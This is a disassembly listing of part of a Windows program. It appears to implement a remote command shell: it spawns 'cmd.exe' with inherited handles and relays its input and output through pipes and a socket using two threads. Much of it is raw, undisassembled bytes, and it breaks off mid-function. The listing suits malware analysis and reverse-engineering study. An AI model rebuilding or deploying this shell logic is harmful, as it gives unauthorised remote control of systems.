                             **************************************************************
                             undefined __cdecl _StartAddress_004016f0(HANDLE param_1)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
             HANDLE            Stack[0x4]:4   param_1                                 XREF[1]:     00401710(R)
             undefined4        Stack[-0x4]:4  local_4                                 XREF[1]:     004017a3(W)
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     00401797(W)
             undefined4        Stack[-0xc]:4  local_c                                 XREF[2]:     0040178c(W),
                                                                                                   00401793(*)
             undefined4        Stack[-0x10]:4 local_10                                XREF[1]:     00401733(W)
             undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     0040172b(W)
             undefined4        Stack[-0x18]:4 local_18                                XREF[3]:     0040171d(*),
                                                                                                   00401723(W),
                                                                                                   00401759(*)
             undefined1        Stack[-0x1c]:1 local_1c                                XREF[2]:     0040170a(*),
                                                                                                   00401755(*)
                             _StartAddress_004016f0                          XREF[1]:     FUN_00401320:004015e2(*)
        004016f0 83 ec 1c        SUB        ESP,0x1c
        004016f3 56              PUSH       ESI
        004016f4 57              PUSH       EDI
        004016f5 6a 18           PUSH       0x18                                             size_t _Size for malloc
        004016f7 e8 d8 05        CALL       MSVCRT.DLL::malloc                               void * malloc(size_t _Size)
                 00 00
        004016fc 83 c4 04        ADD        ESP,0x4
        004016ff e8 fc fe        CALL       FUN_00401600                                     PHANDLE FUN_00401600(void)
                 ff ff
        00401704 8b 3d 2c        MOV        EDI,dword ptr [->KERNEL32.DLL::CreateThread]     = 000023a2
                 20 40 00
        0040170a 8d 4c 24 08     LEA        ECX=>local_1c,[ESP + 0x8]
        0040170e 8b f0           MOV        ESI,EAX
        00401710 8b 44 24 28     MOV        EAX,dword ptr [ESP + param_1]
        00401714 51              PUSH       ECX                                              LPDWORD lpThreadId for CreateThr
        00401715 6a 00           PUSH       0x0                                              DWORD dwCreationFlags for Create
        00401717 56              PUSH       ESI                                              LPVOID lpParameter for CreateThr
        00401718 68 40 19        PUSH       lpStartAddress_00401940                          LPTHREAD_START_ROUTINE lpStartAd
                 40 00
        0040171d 8d 54 24 1c     LEA        EDX=>local_18,[ESP + 0x1c]
        00401721 6a 00           PUSH       0x0                                              SIZE_T dwStackSize for CreateThr
        00401723 c7 44 24        MOV        dword ptr [ESP + local_18],0xc
                 20 0c 00
                 00 00
        0040172b c7 44 24        MOV        dword ptr [ESP + local_14],0x0
                 24 00 00
                 00 00
        00401733 c7 44 24        MOV        dword ptr [ESP + local_10],0x0
                 28 00 00
                 00 00
        0040173b 52              PUSH       EDX                                              LPSECURITY_ATTRIBUTES lpThreadAt
        0040173c 89 46 0c        MOV        dword ptr [ESI + 0xc],EAX
        0040173f ff d7           CALL       EDI=>KERNEL32.DLL::CreateThread
        00401741 85 c0           TEST       EAX,EAX
        00401743 89 46 10        MOV        dword ptr [ESI + 0x10],EAX
        00401746 75 0d           JNZ        LAB_00401755
        00401748 c7 46 0c        MOV        dword ptr [ESI + 0xc],0xffffffff
                 ff ff ff ff
        0040174f 5f              POP        EDI
        00401750 5e              POP        ESI
        00401751 83 c4 1c        ADD        ESP,0x1c
        00401754 c3              RET
                             LAB_00401755                                    XREF[1]:     00401746(j)
        00401755 8d 44 24 08     LEA        EAX=>local_1c,[ESP + 0x8]
        00401759 8d 4c 24 0c     LEA        ECX=>local_18,[ESP + 0xc]
        0040175d 50              PUSH       EAX                                              LPDWORD lpThreadId for CreateThr
        0040175e 6a 00           PUSH       0x0                                              DWORD dwCreationFlags for Create
        00401760 56              PUSH       ESI                                              LPVOID lpParameter for CreateThr
        00401761 68 70 1a        PUSH       lpStartAddress_00401a70                          LPTHREAD_START_ROUTINE lpStartAd
                 40 00
        00401766 6a 00           PUSH       0x0                                              SIZE_T dwStackSize for CreateThr
        00401768 51              PUSH       ECX                                              LPSECURITY_ATTRIBUTES lpThreadAt
        00401769 ff d7           CALL       EDI=>KERNEL32.DLL::CreateThread
        0040176b 85 c0           TEST       EAX,EAX
        0040176d 89 46 14        MOV        dword ptr [ESI + 0x14],EAX
        00401770 75 15           JNZ        LAB_00401787
        00401772 50              PUSH       EAX                                              DWORD dwExitCode for TerminateTh
        00401773 50              PUSH       EAX                                              HANDLE hThread for TerminateThread
        00401774 c7 46 0c        MOV        dword ptr [ESI + 0xc],0xffffffff
                 ff ff ff ff
        0040177b ff 15 28        CALL       dword ptr [->KERNEL32.DLL::TerminateThread]      = 00002390
                 20 40 00
        00401781 5f              POP        EDI
        00401782 5e              POP        ESI
        00401783 83 c4 1c        ADD        ESP,0x1c
        00401786 c3              RET
                             LAB_00401787                                    XREF[1]:     00401770(j)
        00401787 8b 56 10        MOV        EDX,dword ptr [ESI + 0x10]
        0040178a 6a ff           PUSH       -0x1                                             DWORD dwMilliseconds for WaitFor
        0040178c 89 54 24 1c     MOV        dword ptr [ESP + local_c],EDX
        00401790 8b 46 14        MOV        EAX,dword ptr [ESI + 0x14]
        00401793 8d 54 24 1c     LEA        EDX=>local_c,[ESP + 0x1c]
        00401797 89 44 24 20     MOV        dword ptr [ESP + local_8],EAX
        0040179b 8b 4e 08        MOV        ECX,dword ptr [ESI + 0x8]
        0040179e 6a 00           PUSH       0x0                                              BOOL bWaitAll for WaitForMultipl
        004017a0 52              PUSH       EDX                                              HANDLE * lpHandles for WaitForMu
        004017a1 6a 03           PUSH       0x3                                              DWORD nCount for WaitForMultiple
        004017a3 89 4c 24 30     MOV        dword ptr [ESP + local_4],ECX
        004017a7 ff 15 24        CALL       dword ptr [->KERNEL32.DLL::WaitForMultipleObje   = 00002376
                 20 40 00
        004017ad 83 e8 00        SUB        EAX,0x0
        004017b0 74 32           JZ         LAB_004017e4
        004017b2 48              DEC        EAX
        004017b3 74 1b           JZ         LAB_004017d0
        004017b5 48              DEC        EAX
        004017b6 75 44           JNZ        LAB_004017fc
        004017b8 8b 46 14        MOV        EAX,dword ptr [ESI + 0x14]
        004017bb 8b 3d 28        MOV        EDI,dword ptr [->KERNEL32.DLL::TerminateThread]  = 00002390
                 20 40 00
        004017c1 6a 00           PUSH       0x0                                              DWORD dwExitCode for TerminateTh
        004017c3 50              PUSH       EAX                                              HANDLE hThread for TerminateThread
        004017c4 ff d7           CALL       EDI=>KERNEL32.DLL::TerminateThread
        004017c6 8b 4e 10        MOV        ECX,dword ptr [ESI + 0x10]
        004017c9 6a 00           PUSH       0x0                                              DWORD dwExitCode for TerminateTh
        004017cb 51              PUSH       ECX                                              HANDLE hThread for TerminateThread
        004017cc ff d7           CALL       EDI=>KERNEL32.DLL::TerminateThread
        004017ce eb 2c           JMP        LAB_004017fc
                             LAB_004017d0                                    XREF[1]:     004017b3(j)
        004017d0 8b 56 10        MOV        EDX,dword ptr [ESI + 0x10]
        004017d3 6a 00           PUSH       0x0                                              DWORD dwExitCode for TerminateTh
        004017d5 52              PUSH       EDX                                              HANDLE hThread for TerminateThread
        004017d6 ff 15 28        CALL       dword ptr [->KERNEL32.DLL::TerminateThread]      = 00002390
                 20 40 00
        004017dc 8b 46 08        MOV        EAX,dword ptr [ESI + 0x8]
        004017df 6a 01           PUSH       0x1
        004017e1 50              PUSH       EAX
        004017e2 eb 12           JMP        LAB_004017f6
                             LAB_004017e4                                    XREF[1]:     004017b0(j)
        004017e4 8b 4e 14        MOV        ECX,dword ptr [ESI + 0x14]
        004017e7 6a 00           PUSH       0x0                                              DWORD dwExitCode for TerminateTh
        004017e9 51              PUSH       ECX                                              HANDLE hThread for TerminateThread
        004017ea ff 15 28        CALL       dword ptr [->KERNEL32.DLL::TerminateThread]      = 00002390
                 20 40 00
        004017f0 8b 56 08        MOV        EDX,dword ptr [ESI + 0x8]
        004017f3 6a 01           PUSH       0x1                                              UINT uExitCode for TerminateProc
        004017f5 52              PUSH       EDX                                              HANDLE hProcess for TerminatePro
                             LAB_004017f6                                    XREF[1]:     004017e2(j)
        004017f6 ff 15 20        CALL       dword ptr [->KERNEL32.DLL::TerminateProcess]     = 00002362
                 20 40 00
                             LAB_004017fc                                    XREF[2]:     004017b6(j), 004017ce(j)
        004017fc 8b 46 0c        MOV        EAX,dword ptr [ESI + 0xc]
        004017ff 53              PUSH       EBX
        00401800 50              PUSH       EAX
        00401801 e8 84 06        CALL       WS2_32.DLL::Ordinal_3                            undefined Ordinal_3()
                 00 00
        00401806 8b 0e           MOV        ECX,dword ptr [ESI]
        00401808 8b 1d 1c        MOV        EBX,dword ptr [->KERNEL32.DLL::DisconnectNamed   = 0000234c
                 20 40 00
        0040180e 51              PUSH       ECX                                              HANDLE hNamedPipe for Disconnect
        0040180f ff d3           CALL       EBX=>KERNEL32.DLL::DisconnectNamedPipe
        00401811 8b 16           MOV        EDX,dword ptr [ESI]
        00401813 8b 3d 00        MOV        EDI,dword ptr [->KERNEL32.DLL::CloseHandle]      = 000022e0
                 20 40 00
        00401819 52              PUSH       EDX                                              HANDLE hObject for CloseHandle
        0040181a ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        0040181c 8b 46 04        MOV        EAX,dword ptr [ESI + 0x4]
        0040181f 50              PUSH       EAX                                              HANDLE hNamedPipe for Disconnect
        00401820 ff d3           CALL       EBX=>KERNEL32.DLL::DisconnectNamedPipe
        00401822 8b 4e 04        MOV        ECX,dword ptr [ESI + 0x4]
        00401825 51              PUSH       ECX                                              HANDLE hObject for CloseHandle
        00401826 ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        00401828 8b 56 10        MOV        EDX,dword ptr [ESI + 0x10]
        0040182b 52              PUSH       EDX                                              HANDLE hObject for CloseHandle
        0040182c ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        0040182e 8b 46 14        MOV        EAX,dword ptr [ESI + 0x14]
        00401831 50              PUSH       EAX                                              HANDLE hObject for CloseHandle
        00401832 ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        00401834 8b 4e 08        MOV        ECX,dword ptr [ESI + 0x8]
        00401837 51              PUSH       ECX                                              HANDLE hObject for CloseHandle
        00401838 ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        0040183a 85 f6           TEST       ESI,ESI
        0040183c 5b              POP        EBX
        0040183d 74 09           JZ         LAB_00401848
        0040183f 56              PUSH       ESI                                              void * _Memory for free
        00401840 e8 89 04        CALL       MSVCRT.DLL::free                                 void free(void * _Memory)
                 00 00
        00401845 83 c4 04        ADD        ESP,0x4
                             LAB_00401848                                    XREF[1]:     0040183d(j)
        00401848 e8 03 03        CALL       FUN_00401b50                                     undefined4 FUN_00401b50(void)
                 00 00
        0040184d 5f              POP        EDI
        0040184e 5e              POP        ESI
        0040184f 83 c4 1c        ADD        ESP,0x1c
        00401852 c3              RET
        00401853 90 90 90        align      align(13)
                 90 90 90
                 90 90 90
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             HANDLE __cdecl FUN_00401860(HANDLE param_1, HANDLE param
                               assume FS_OFFSET = 0xffdff000
             HANDLE            EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   param_1                                 XREF[1]:     00401863(R)
             HANDLE            Stack[0x8]:4   param_2                                 XREF[1]:     00401869(R)
             undefined4        Stack[-0x4]:4  local_4                                 XREF[2]:     00401879(*),
                                                                                                   004018c2(W)
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     004018be(W)
             undefined4        Stack[-0xc]:4  local_c                                 XREF[1]:     004018ba(W)
             undefined4        Stack[-0x10]:4 local_10                                XREF[1]:     004018a9(W)
             undefined2        Stack[-0x12]:2 local_12                                XREF[1]:     004018ad(W)
             undefined2        Stack[-0x14]:2 local_14                                XREF[1]:     004018a4(W)
             undefined4        Stack[-0x18]:4 local_18                                XREF[1]:     004018b2(W)
             undefined4        Stack[-0x28]:4 local_28                                XREF[1]:     00401894(W)
             undefined4        Stack[-0x2c]:4 local_2c                                XREF[1]:     00401898(W)
             undefined4        Stack[-0x30]:4 local_30                                XREF[1]:     0040189c(W)
             undefined4        Stack[-0x34]:4 local_34                                XREF[1]:     004018a0(W)
             undefined4        Stack[-0x38]:4 local_38                                XREF[1]:     0040188c(W)
             undefined4        Stack[-0x3c]:4 local_3c                                XREF[1]:     00401890(W)
             undefined4        Stack[-0x40]:4 local_40                                XREF[1]:     00401888(W)
             undefined4        Stack[-0x44]:4 local_44                                XREF[1]:     00401880(W)
                             FUN_00401860                                    XREF[1]:     FUN_00401600:004016bf(c)
        00401860 83 ec 60        SUB        ESP,0x60
        00401863 8b 44 24 64     MOV        EAX,dword ptr [ESP + param_1]
        00401867 53              PUSH       EBX
        00401868 56              PUSH       ESI
        00401869 8b 74 24 70     MOV        ESI,dword ptr [ESP + param_2]
        0040186d 33 db           XOR        EBX,EBX
        0040186f 57              PUSH       EDI
        00401870 8b 3d 38        MOV        EDI,dword ptr [->KERNEL32.DLL::GetCurrentProce   = 000023d6
                 20 40 00
        00401876 53              PUSH       EBX                                              DWORD dwOptions for DuplicateHan
        00401877 6a 01           PUSH       0x1                                              BOOL bInheritHandle for Duplicat
        00401879 8d 4c 24 70     LEA        ECX=>local_4,[ESP + 0x70]
        0040187d 6a 02           PUSH       0x2                                              DWORD dwDesiredAccess for Duplic
        0040187f 51              PUSH       ECX                                              LPHANDLE lpTargetHandle for Dupl
        00401880 c7 44 24        MOV        dword ptr [ESP + local_44],0x44
                 38 44 00
                 00 00
        00401888 89 5c 24 3c     MOV        dword ptr [ESP + local_40],EBX
        0040188c 89 5c 24 44     MOV        dword ptr [ESP + local_38],EBX
        00401890 89 5c 24 40     MOV        dword ptr [ESP + local_3c],EBX
        00401894 89 5c 24 54     MOV        dword ptr [ESP + local_28],EBX
        00401898 89 5c 24 50     MOV        dword ptr [ESP + local_2c],EBX
        0040189c 89 5c 24 4c     MOV        dword ptr [ESP + local_30],EBX
        004018a0 89 5c 24 48     MOV        dword ptr [ESP + local_34],EBX
        004018a4 66 89 5c        MOV        word ptr [ESP + local_14],BX
                 24 68
        004018a9 89 5c 24 6c     MOV        dword ptr [ESP + local_10],EBX
        004018ad 66 89 5c        MOV        word ptr [ESP + local_12],BX
                 24 6a
        004018b2 c7 44 24        MOV        dword ptr [ESP + local_18],0x101
                 64 01 01
                 00 00
        004018ba 89 44 24 70     MOV        dword ptr [ESP + local_c],EAX
        004018be 89 74 24 74     MOV        dword ptr [ESP + local_8],ESI
        004018c2 89 74 24 78     MOV        dword ptr [ESP + local_4],ESI
        004018c6 ff d7           CALL       EDI=>KERNEL32.DLL::GetCurrentProcess
        004018c8 50              PUSH       EAX                                              HANDLE hTargetProcessHandle for
        004018c9 56              PUSH       ESI                                              HANDLE hSourceHandle for Duplica
        004018ca ff d7           CALL       EDI=>KERNEL32.DLL::GetCurrentProcess
        004018cc 50              PUSH       EAX                                              HANDLE hSourceProcessHandle for
        004018cd ff 15 34        CALL       dword ptr [->KERNEL32.DLL::DuplicateHandle]      = 000023c4
                 20 40 00
        004018d3 bf 68 30        MOV        EDI,s_cmd.exe_00403068                           = "cmd.exe"
                 40 00
        004018d8 83 c9 ff        OR         ECX,0xffffffff
        004018db 33 c0           XOR        EAX,EAX
        004018dd 8d 54 24 0c     LEA        EDX,[ESP + 0xc]
        004018e1 f2 ae           SCASB.RE   ES:EDI
        004018e3 f7 d1           NOT        ECX
        004018e5 2b f9           SUB        EDI,ECX
        004018e7 8b c1           MOV        EAX,ECX
        004018e9 8b f7           MOV        ESI,EDI
        004018eb 8b fa           MOV        EDI,EDX
        004018ed 8d 54 24 28     LEA        EDX,[ESP + 0x28]
        004018f1 c1 e9 02        SHR        ECX,0x2
        004018f4 f3 a5           MOVSD.REP  ES:EDI,ESI
        004018f6 8b c8           MOV        ECX,EAX
        004018f8 8d 44 24 0c     LEA        EAX,[ESP + 0xc]
        004018fc 83 e1 03        AND        ECX,0x3
        004018ff f3 a4           MOVSB.REP  ES:EDI,ESI
        00401901 8d 4c 24 18     LEA        ECX,[ESP + 0x18]
        00401905 51              PUSH       ECX                                              LPPROCESS_INFORMATION lpProcessI
        00401906 52              PUSH       EDX                                              LPSTARTUPINFOA lpStartupInfo for
        00401907 53              PUSH       EBX                                              LPCSTR lpCurrentDirectory for Cr
        00401908 53              PUSH       EBX                                              LPVOID lpEnvironment for CreateP
        00401909 53              PUSH       EBX                                              DWORD dwCreationFlags for Create
        0040190a 6a 01           PUSH       0x1                                              BOOL bInheritHandles for CreateP
        0040190c 53              PUSH       EBX                                              LPSECURITY_ATTRIBUTES lpThreadAt
        0040190d 53              PUSH       EBX                                              LPSECURITY_ATTRIBUTES lpProcessA
        0040190e 50              PUSH       EAX                                              LPSTR lpCommandLine for CreatePr
        0040190f 53              PUSH       EBX                                              LPCSTR lpApplicationName for Cre
        00401910 ff 15 30        CALL       dword ptr [->KERNEL32.DLL::CreateProcessA]       = 000023b2
                 20 40 00
        00401916 85 c0           TEST       EAX,EAX
        00401918 74 18           JZ         LAB_00401932
        0040191a 8b 4c 24 1c     MOV        ECX,dword ptr [ESP + 0x1c]
        0040191e 8b 74 24 18     MOV        ESI,dword ptr [ESP + 0x18]
        00401922 51              PUSH       ECX                                              HANDLE hObject for CloseHandle
        00401923 ff 15 00        CALL       dword ptr [->KERNEL32.DLL::CloseHandle]          = 000022e0
                 20 40 00
        00401929 8b c6           MOV        EAX,ESI
        0040192b 5f              POP        EDI
        0040192c 5e              POP        ESI
        0040192d 5b              POP        EBX
        0040192e 83 c4 60        ADD        ESP,0x60
        00401931 c3              RET
                             LAB_00401932                                    XREF[1]:     00401918(j)
        00401932 5f              POP        EDI
        00401933 8b c3           MOV        EAX,EBX
        00401935 5e              POP        ESI
        00401936 5b              POP        EBX
        00401937 83 c4 60        ADD        ESP,0x60
        0040193a c3              RET
        0040193b 90 90 90        align      align(5)
                 90 90
                             **************************************************************
                             * lpStartAddress parameter of CreateThread                   *
                             *                                                            *
                             **************************************************************
                             lpStartAddress_00401940                         XREF[1]:     _StartAddress_004016f0:00401718(
        00401940 81 ec 14 04     LPTHREAD   DAT_0414ec81
        00401944 00              ??         00h
        00401945 00              ??         00h
        00401946 55              ??         55h    U
        00401947 56              ??         56h    V
        00401948 57              ??         57h    W
        00401949 6a              ??         6Ah    j
        0040194a 18              ??         18h
        0040194b e8              ??         E8h
        0040194c 84              ??         84h
        0040194d 03              ??         03h
        0040194e 00              ??         00h
        0040194f 00              ??         00h
        00401950 8b              ??         8Bh
        00401951 b4              ??         B4h
        00401952 24              ??         24h    $
        00401953 28              ??         28h    (
        00401954 04              ??         04h
        00401955 00              ??         00h
        00401956 00              ??         00h
        00401957 8b              ??         8Bh
        00401958 e8              ??         E8h
        00401959 83              ??         83h
        0040195a c4              ??         C4h
        0040195b 04              ??         04h
        0040195c b9              ??         B9h
        0040195d 06              ??         06h
        0040195e 00              ??         00h
        0040195f 00              ??         00h
        00401960 00              ??         00h
        00401961 8b              ??         8Bh
        00401962 fd              ??         FDh
        00401963 8d              ??         8Dh
        00401964 44              ??         44h    D
        00401965 24              ??         24h    $
        00401966 0c              ??         0Ch
        00401967 f3              ??         F3h
        00401968 a5              ??         A5h
        00401969 8b              ??         8Bh
        0040196a 55              ??         55h    U
        0040196b 00              ??         00h
        0040196c 8b              ??         8Bh
        0040196d 3d              ??         3Dh    =
        0040196e 40              ??         40h    @                                         ?  ->  00402040
        0040196f 20              ??         20h
        00401970 40              ??         40h    @
        00401971 00              ??         00h
        00401972 6a              ??         6Ah    j
        00401973 00              ??         00h
        00401974 6a              ??         6Ah    j
        00401975 00              ??         00h
        00401976 50              ??         50h    P
        00401977 8d              ??         8Dh
        00401978 4c              ??         4Ch    L
        00401979 24              ??         24h    $
        0040197a 2c              ??         2Ch    ,
        0040197b 68              ??         68h    h
        0040197c 00              ??         00h
        0040197d 04              ??         04h
        0040197e 00              ??         00h
        0040197f 00              ??         00h
        00401980 51              ??         51h    Q
        00401981 52              ??         52h    R
        00401982 ff              ??         FFh
        00401983 d7              ??         D7h
        00401984 85              ??         85h
        00401985 c0              ??         C0h
        00401986 0f              ??         0Fh
        00401987 84              ??         84h
        00401988 c8              ??         C8h
        00401989 00              ??         00h
        0040198a 00              ??         00h
        0040198b 00              ??         00h
        0040198c 8b              ??         8Bh
        0040198d 35              ??         35h    5
        0040198e 3c              ??         3Ch    <                                         ?  ->  0040203c
        0040198f 20              ??         20h
        00401990 40              ??         40h    @
        00401991 00              ??         00h
        00401992 8b              ??         8Bh
        00401993 44              ??         44h    D
        00401994 24              ??         24h    $
        00401995 0c              ??         0Ch
        00401996 85              ??         85h
        00401997 c0              ??         C0h
        00401998 0f              ??         0Fh
        00401999 86              ??         86h
        0040199a 8d              ??         8Dh
        0040199b 00              ??         00h
        0040199c 00              ??         00h
        0040199d 00              ??         00h
        0040199e 8b              ??         8Bh
        0040199f 55              ??         55h    U
        004019a0 00              ??         00h
        004019a1 8d              ??         8Dh
        004019a2 44              ??         44h    D
        004019a3 24              ??         24h    $
        004019a4 0c              ??         0Ch
        004019a5 6a              ??         6Ah    j
        004019a6 00              ??         00h
        004019a7 50              ??         50h    P
        004019a8 8d              ??         8Dh
        004019a9 4c              ??         4Ch    L
        004019aa 24              ??         24h    $
        004019ab 28              ??         28h    (
        004019ac 68              ??         68h    h
        004019ad 00              ??         00h
        004019ae 04              ??         04h
        004019af 00              ??         00h
        004019b0 00              ??         00h
        004019b1 51              ??         51h    Q
        004019b2 52              ??         52h    R
        004019b3 ff              ??         FFh
        004019b4 d6              ??         D6h
        004019b5 8b              ??         8Bh
        004019b6 44              ??         44h    D
        004019b7 24              ??         24h    $
        004019b8 0c              ??         0Ch
        004019b9 68              ??         68h    h
        004019ba 14              ??         14h                                              ?  ->  00403014
        004019bb 30              ??         30h    0
        004019bc 40              ??         40h    @
        004019bd 00              ??         00h
        004019be c6              ??         C6h
        004019bf 44              ??         44h    D
        004019c0 04              ??         04h
        004019c1 24              ??         24h    $
        004019c2 00              ??         00h
        004019c3 40              ??         40h    @
        004019c4 89              ??         89h
        004019c5 44              ??         44h    D
        004019c6 24              ??         24h    $
        004019c7 10              ??         10h
        004019c8 8d              ??         8Dh
        004019c9 44              ??         44h    D
        004019ca 24              ??         24h    $
        004019cb 18              ??         18h
        004019cc 50              ??         50h    P
        004019cd e8              ??         E8h
        004019ce ee              ??         EEh
        004019cf f6              ??         F6h
        004019d0 ff              ??         FFh
        004019d1 ff              ??         FFh
        004019d2 8b              ??         8Bh
        004019d3 4c              ??         4Ch    L
        004019d4 24              ??         24h    $
        004019d5 14              ??         14h
        004019d6 8d              ??         8Dh
        004019d7 54              ??         54h    T
        004019d8 24              ??         24h    $
        004019d9 28              ??         28h    (
        004019da 51              ??         51h    Q
        004019db 8d              ??         8Dh
        004019dc 44              ??         44h    D
        004019dd 24              ??         24h    $
        004019de 20              ??         20h
        004019df 52              ??         52h    R
        004019e0 50              ??         50h    P
        004019e1 e8              ??         E8h
        004019e2 fa              ??         FAh
        004019e3 f7              ??         F7h
        004019e4 ff              ??         FFh
        004019e5 ff              ??         FFh
        004019e6 8b              ??         8Bh
        004019e7 54              ??         54h    T
        004019e8 24              ??         24h    $
        004019e9 20              ??         20h
        004019ea 83              ??         83h
        004019eb c4              ??         C4h
        004019ec 14              ??         14h
        004019ed 8d              ??         8Dh
        004019ee 4c              ??         4Ch    L
        004019ef 24              ??         24h    $
        004019f0 10              ??         10h
        004019f1 6a              ??         6Ah    j
        004019f2 00              ??         00h
        004019f3 6a              ??         6Ah    j
        004019f4 04              ??         04h
        004019f5 6a              ??         6Ah    j
        004019f6 0a              ??         0Ah
        004019f7 51              ??         51h    Q
        004019f8 52              ??         52h    R
        004019f9 e8              ??         E8h
        004019fa a2              ??         A2h
        004019fb 04              ??         04h
        004019fc 00              ??         00h
        004019fd 00              ??         00h
        004019fe 83              ??         83h
        004019ff c4              ??         C4h
        00401a00 0c              ??         0Ch
        00401a01 50              ??         50h    P
        00401a02 8b              ??         8Bh
        00401a03 45              ??         45h    E
        00401a04 0c              ??         0Ch
        00401a05 50              ??         50h    P
        00401a06 e8              ??         E8h
        00401a07 61              ??         61h    a
        00401a08 04              ??         04h
        00401a09 00              ??         00h
        00401a0a 00              ??         00h
        00401a0b 85              ??         85h
        00401a0c c0              ??         C0h
        00401a0d 7e              ??         7Eh    ~
        00401a0e 45              ??         45h    E
        00401a0f 8b              ??         8Bh
        00401a10 4c              ??         4Ch    L
        00401a11 24              ??         24h    $
        00401a12 0c              ??         0Ch
        00401a13 8b              ??         8Bh
        00401a14 45              ??         45h    E
        00401a15 0c              ??         0Ch
        00401a16 8d              ??         8Dh
        00401a17 54              ??         54h    T
        00401a18 24              ??         24h    $
        00401a19 20              ??         20h
        00401a1a 51              ??         51h    Q
        00401a1b 52              ??         52h    R
        00401a1c 50              ??         50h    P
        00401a1d e8              ??         E8h
        00401a1e 4e              ??         4Eh    N
        00401a1f f8              ??         F8h
        00401a20 ff              ??         FFh
        00401a21 ff              ??         FFh
        00401a22 83              ??         83h
        00401a23 c4              ??         C4h
        00401a24 0c              ??         0Ch
        00401a25 85              ??         85h
        00401a26 c0              ??         C0h
        00401a27 7e              ??         7Eh    ~
        00401a28 2b              ??         2Bh    +
        00401a29 eb              ??         EBh
        00401a2a 08              ??         08h
        00401a2b 6a              ??         6Ah    j
        00401a2c 32              ??         32h    2
        00401a2d ff              ??         FFh
        00401a2e 15              ??         15h
        00401a2f 10              ??         10h                                              ?  ->  00402010
        00401a30 20              ??         20h
        00401a31 40              ??         40h    @
        00401a32 00              ??         00h
        00401a33 8b              ??         8Bh
        00401a34 45              ??         45h    E
        00401a35 00              ??         00h
        00401a36 6a              ??         6Ah    j
        00401a37 00              ??         00h
        00401a38 8d              ??         8Dh
        00401a39 4c              ??         4Ch    L
        00401a3a 24              ??         24h    $
        00401a3b 10              ??         10h
        00401a3c 6a              ??         6Ah    j
        00401a3d 00              ??         00h
        00401a3e 51              ??         51h    Q
        00401a3f 8d              ??         8Dh
        00401a40 54              ??         54h    T
        00401a41 24              ??         24h    $
        00401a42 2c              ??         2Ch    ,
        00401a43 68              ??         68h    h
        00401a44 00              ??         00h
        00401a45 04              ??         04h
        00401a46 00              ??         00h
        00401a47 00              ??         00h
        00401a48 52              ??         52h    R
        00401a49 50              ??         50h    P
        00401a4a ff              ??         FFh
        00401a4b d7              ??         D7h
        00401a4c 85              ??         85h
        00401a4d c0              ??         C0h
        00401a4e 0f              ??         0Fh
        00401a4f 85              ??         85h
        00401a50 3e              ??         3Eh    >
        00401a51 ff              ??         FFh
        00401a52 ff              ??         FFh
        00401a53 ff              ??         FFh
        00401a54 55              ??         55h    U
        00401a55 e8              ??         E8h
        00401a56 74              ??         74h    t
        00401a57 02              ??         02h
        00401a58 00              ??         00h
        00401a59 00              ??         00h
        00401a5a 83              ??         83h
        00401a5b c4              ??         C4h
        00401a5c 04              ??         04h
        00401a5d 6a              ??         6Ah    j
        00401a5e 00              ??         00h
        00401a5f ff              ??         FFh
        00401a60 15              ??         15h
        00401a61 0c              ??         0Ch                                              ?  ->  0040200c
        00401a62 20              ??         20h
        00401a63 40              ??         40h    @
        00401a64 00              ??         00h
        00401a65 5f              ??         5Fh    _
        00401a66 5e              ??         5Eh    ^
        00401a67 5d              ??         5Dh    ]
        00401a68 90              ??         90h
        00401a69 90              ??         90h
        00401a6a 90              ??         90h
        00401a6b 90              ??         90h
        00401a6c 90              ??         90h
        00401a6d 90              ??         90h
        00401a6e 90              ??         90h
        00401a6f 90              ??         90h
                             **************************************************************
                             * lpStartAddress parameter of CreateThread                   *
                             *                                                            *
                             **************************************************************
                             lpStartAddress_00401a70                         XREF[1]:     _StartAddress_004016f0:00401761(
        00401a70 81 ec 10 04     LPTHREAD   DAT_0410ec81
        00401a74 00              ??         00h
        00401a75 00              ??         00h
        00401a76 53              ??         53h    S
        00401a77 56              ??         56h    V
        00401a78 57              ??         57h    W
        00401a79 6a              ??         6Ah    j
        00401a7a 18              ??         18h
        00401a7b e8              ??         E8h
        00401a7c 54              ??         54h    T
        00401a7d 02              ??         02h
        00401a7e 00              ??         00h
        00401a7f 00              ??         00h
        00401a80 8b              ??         8Bh
        00401a81 b4              ??         B4h
        00401a82 24              ??         24h    $
        00401a83 24              ??         24h    $
        00401a84 04              ??         04h
        00401a85 00              ??         00h
        00401a86 00              ??         00h
        00401a87 8b              ??         8Bh
        00401a88 d8              ??         D8h
        00401a89 83              ??         83h
        00401a8a c4              ??         C4h
        00401a8b 04              ??         04h
        00401a8c b9              ??         B9h
        00401a8d 06              ??         06h
        00401a8e 00              ??         00h
        00401a8f 00              ??         00h
        00401a90 00              ??         00h
        00401a91 8b              ??         8Bh
        00401a92 fb              ??         FBh
        00401a93 8d              ??         8Dh
        00401a94 44              ??         44h    D
        00401a95 24              ??         24h    $
        00401a96 1c              ??         1Ch
        00401a97 f3              ??         F3h
        00401a98 a5              ??         A5h
        00401a99 8b              ??         8Bh
        00401a9a 4b              ??         4Bh    K
        00401a9b 0c              ??         0Ch
        00401a9c 6a              ??         6Ah    j
        00401a9d 00              ??         00h
        00401a9e 68              ??         68h    h
        00401a9f 00              ??         00h
        00401aa0 04              ??         04h
        00401aa1 00              ??         00h
        00401aa2 00              ??         00h
        00401aa3 50              ??         50h    P
        00401aa4 51              ??         51h    Q
        00401aa5 e8              ??         E8h
        00401aa6 c8              ??         C8h
        00401aa7 03              ??         03h
        00401aa8 00              ??         00h
        00401aa9 00              ??         00h
        00401aaa 8b              ??         8Bh
        00401aab f0              ??         F0h
        00401aac 83              ??         83h
        00401aad fe              ??         FEh
        00401aae ff              ??         FFh
        00401aaf 74              ??         74h    t
        00401ab0 70              ??         70h    p
        00401ab1 8b              ??         8Bh
        00401ab2 3d              ??         3Dh    =
        00401ab3 48              ??         48h    H                                         ?  ->  00402048
        00401ab4 20              ??         20h
